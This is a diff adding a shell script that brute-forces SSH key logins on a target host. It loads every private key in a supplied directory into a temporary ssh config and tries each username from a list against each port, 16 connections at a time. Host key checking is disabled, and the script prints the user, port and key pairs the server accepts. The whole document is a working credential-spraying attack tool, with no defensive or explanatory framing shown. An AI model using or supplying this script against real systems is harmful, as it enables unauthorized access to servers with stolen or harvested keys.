@@ -1,0 +1,42 @@
+#!/bin/sh
+
+TARGET="$1"
+USER_LIST="$2"
+KEYS_DIR="$3"
+FIRST_MATCH="$4"
+[ -z "$FIRST_MATCH" ] && FIRST_MATCH="yes"
+PORTS="$5"
+
+ORIGIN="$(readlink -f "$0" | xargs dirname)"
+export PATH="$ORIGIN:$PATH"
+
+get_ports() {
+    if [ -z "$PORTS" ]
+    then
+        cat -
+    else
+        echo "$PORTS"
+    fi
+}
+
+BRUT_SSH_KEYS='
+    conf="$(mktemp)"
+    echo "Host *" > "$conf"
+    find "'"$KEYS_DIR"'" -type f -name "*_id" | xargs -r -n 1 echo "  IdentityFile" >> "$conf"
+
+    while read user || [ -n "$user" ];
+    do
+    ssh -v -F "$conf" -n -p "XXX" \
+            -o PasswordAuthentication=no \
+            -o ConnectTimeout=5 \
+            -o Batchmode=yes \
+            -o StrictHostKeyChecking=no \
+            -o UserKnownHostsFile=/dev/null \
+            "$user"@'"$TARGET"' echo 2>&1 \ | \
+            grep -E -m 1 -H --label="$user:XXX:" -B1 "Server accepts key|Authentication succeeded " | \
+            grep -E "Offering|Trying private" && [ '"$FIRST_MATCH"' = "yes" ] && break
+    done < '"$USER_LIST"'
+    rm -f "$conf"
+'
+get_ports | sed 's/*://g' | xargs -P 16 -IXXX -n 1 -r sh -c "$BRUT_SSH_KEYS" | tr -d '\r' | \
+    awk -F '(\\s+)?:(\\s+)?|public key: | RSA [A-Z]+' '{print "SSH_KEY_ACCESS:"$1":"$2":"$5}'
